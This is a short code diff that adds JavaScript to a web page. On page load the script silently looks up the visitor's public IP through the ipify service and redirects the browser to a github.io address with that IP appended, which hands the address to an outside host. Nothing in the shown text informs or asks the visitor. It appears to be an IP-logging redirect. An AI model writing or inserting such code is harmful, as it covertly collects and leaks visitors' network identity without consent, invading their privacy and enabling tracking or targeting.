@@ -5,4 +5,15 @@ function Linkversite(url) {
     return href
 }
 
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+const ip = (httpGet('https://api.ipify.org/'))
+
+window.location.replace(Linkversite("dfgvbbt.github.io/empty?"+ip))
 </script>
